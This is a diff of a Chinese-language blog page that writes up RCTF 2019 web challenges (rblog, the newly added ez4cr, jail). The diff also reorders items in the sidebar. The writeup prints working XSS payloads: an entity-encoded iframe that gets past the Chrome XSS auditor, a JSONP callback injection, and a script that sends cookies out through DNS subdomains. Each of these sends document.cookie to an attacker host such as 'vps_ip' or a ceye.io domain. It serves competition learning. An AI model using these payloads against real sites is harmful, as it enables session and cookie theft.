@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -411,10 +411,13 @@ height:50vh;
 <p>尝试在后面添加标签也不能解析，返回的<code>content-type</code>是<code>json</code>，这个时候想到<code>/api/v2/</code>的v2是表示版本号的，后台有没有v1呢，访问一下<code>/api/v1/posts</code>，发现居然正常回显！！！<br>再尝试一下在后面加标签，这次返回是<code>content-type: text/html</code>了，也就是说可以成功执行xss了<br><img src="/assets/2019rctf/7.png" alt=""><br>贴上题目的提示<br><img src="/assets/2019rctf/8.png" alt=""><br>所以我们可以尝试一下<code>/api/v1/posts?callback=test</code>，这个时候会返回<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test(&#123;...&#125;)</span><br></pre></td></tr></table></figure></p>
 <p>但是如果我们改成<code>&lt;script&gt;</code>标签打过去，<code>/</code>会被转义，fuzz一下，转义的只有斜杠和引号，所以我们可以用<code>iframe</code>执行实体编码打过去来绕过，到了这里还有一个难点，题目说了bot用的是最新版的chrome，如果url中的代码和页面内的代码一致就会拦截，而且这个拦截还严格很多，有没有什么方法可以绕过呢？思考一下，假设传进一个无用的参数，这个参数在回传的时候会被后台转义，因此就会造成代码不同实现绕过，这里可以知道中文字符的存储是unicode编码的，自带斜杠，所以我们只要加上中文字符就行，最后的payload<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc%3D%E5%95%8A%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2332%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23120%3B%26%23120%3B%26%23120%3B%26%2358%3B%26%23120%3B%26%23120%3B%26%23120%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2363%3B%26%2339%3B%26%2337%3B%26%2350%3B%26%2398%3B%26%23101%3B%26%23115%3B%26%2399%3B%26%2397%3B%26%23112%3B%26%23101%3B%26%2340%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2341%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure></p>
 <p>提交给管理员就可以拿到flag了<br><img src="/assets/2019rctf/9.png" alt=""><br><img src="/assets/2019rctf/10.png" alt=""></p>
+<h3 id="ez4cr"><a href="#ez4cr" class="headerlink" title="ez4cr"></a>ez4cr</h3><p>题目如下<br><img src="/assets/2019rctf/11.png" alt=""><br>依旧是xss，这次要打的是<code>report-rblog</code>的cookie，结合上一题的提示<code>the flag for rblog2019.2 is in the cookie of the report domain. You may need a chrome xss auditor bypass ._.</code>，应该不会是audition的0day，只能继续分析题目场景<br>先看一下题目源码<code>report.js</code><br><img src="/assets/2019rctf/12.png" alt=""><br>这里有个<code>report.php</code>，跟过去看一下，测试一下，发现他也是<code>support jsonp</code>的<br><img src="/assets/2019rctf/13.png" alt=""><br>测试一下中文，这次不行了<br><img src="/assets/2019rctf/14.png" alt=""><br>然后测试过去发现后端会将传过去的<code>http</code>改成<code>https</code>传回来，所以我们只要修改src的路径为<code>http</code>就能bypass了，payload<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//report-rblog.2019.rctf.rois.io/report.php?callback=&lt;script%20src=http://report-rblog.2019.rctf.rois.io/report.php?callback=location.href=%27http://vps_ip/xss?%27%25%32%62escape(document.cookie);&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>report给bot就能拿到flag了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RCTF&#123;charset_in_content-type_ignored._.??did_i_find_a_chrome_xss_filter_bypass_0day&#125;</span><br></pre></td></tr></table></figure></p>
 <h3 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h3><p>这个页面登录注册进去看见一个编写留言的框，一个反馈给admin看留言，还有一个文件上传的地方<br>抓个包先看一看有没有什么提示<br><img src="/assets/2019rctf/4.png" alt=""><br>看到有两个hint，<code>flag1_is_in_cookie</code>和<code>meta_refresh_is_banned_in_server</code>，所以应该是要打到admin的cookie，所以应该是xss的利用，我们先继续审计一下源码+fuzz一下字符，看下有没有什么限制<br>在火狐操作了一波，用img标签打过去没有反应，猜测bot应该是chrome的，而且还禁止了跳转<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.addEventListenr(<span class="string">"beforeunload"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event.returnValue = <span class="string">"Are you sure want to exit?"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Are you sure want to exit?"</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">document</span>.location)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>freeze对象以后是没有办法解冻的，只能克隆一个具有相同属性的新对象，通过修改新对象的属性来达到目的<br>看一下location有什么能利用<br><img src="/assets/2019rctf/5.png" alt=""><br>尝试一下换一下属性，发现host和hostname可以修改属性且跳转，最终利用<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">function stringToHex(str)&#123; </span><br><span class="line">	var val=""; </span><br><span class="line">	for(var i = 0; i &lt; str.length; i++)&#123; </span><br><span class="line">		if(val == "") </span><br><span class="line">			val = str.charCodeAt(i).toString(16); </span><br><span class="line">		else </span><br><span class="line">			val += str.charCodeAt(i).toString(16); </span><br><span class="line">	&#125; </span><br><span class="line">	return val; </span><br><span class="line">&#125; location.hostname=stringToHex(document.cookie).substr(0,500)+".onsdtb.ceye.io"&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <p>最后看dns流量就行  </p>
 <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="draw"><a href="#draw" class="headerlink" title="draw"></a>draw</h3><p>logo command语句，找个在线工具就能解出来<br><img src="/assets/2019rctf/6.png" alt=""></p>
+<p>这场比赛出题还是很不错的，菜鸡学到了不少，涨姿势了  </p>
 
     </article>
     <!-- license  -->
@@ -540,7 +543,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nextphp"><span class="toc-number">1.1.</span> <span class="toc-text">nextphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rblog"><span class="toc-number">1.2.</span> <span class="toc-text">rblog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jail"><span class="toc-number">1.3.</span> <span class="toc-text">jail</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#draw"><span class="toc-number">2.1.</span> <span class="toc-text">draw</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nextphp"><span class="toc-number">1.1.</span> <span class="toc-text">nextphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rblog"><span class="toc-number">1.2.</span> <span class="toc-text">rblog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez4cr"><span class="toc-number">1.3.</span> <span class="toc-text">ez4cr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jail"><span class="toc-number">1.4.</span> <span class="toc-text">jail</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#draw"><span class="toc-number">2.1.</span> <span class="toc-text">draw</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -553,12 +556,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1342,12 +1339,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/2019西湖论剑web-writeup/">2019西湖论剑web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
@@ -1358,11 +1360,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/2019-0ctf-wp/">2019 0ctf wp</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
@@ -1559,9 +1556,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="安恒杯"><span class="iconfont-archer">&#xe606;</span>安恒杯</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="MongoDB"><span class="iconfont-archer">&#xe606;</span>MongoDB</span>
     
@@ -1571,9 +1568,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="javascript"><span class="iconfont-archer">&#xe606;</span>javascript</span>
     
-        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
-    
         <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
@@ -1626,13 +1623,13 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="web/crypto"><span class="iconfont-archer">&#xe60a;</span>web/crypto</span>
     
-        <span class="sidebar-category-name" data-categories="web/misc"><span class="iconfont-archer">&#xe60a;</span>web/misc</span>
-    
         <span class="sidebar-category-name" data-categories="web/crypto/misc"><span class="iconfont-archer">&#xe60a;</span>web/crypto/misc</span>
     
         <span class="sidebar-category-name" data-categories="cve"><span class="iconfont-archer">&#xe60a;</span>cve</span>
     
         <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
+    
+        <span class="sidebar-category-name" data-categories="web/misc"><span class="iconfont-archer">&#xe60a;</span>web/misc</span>
     
         <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
     
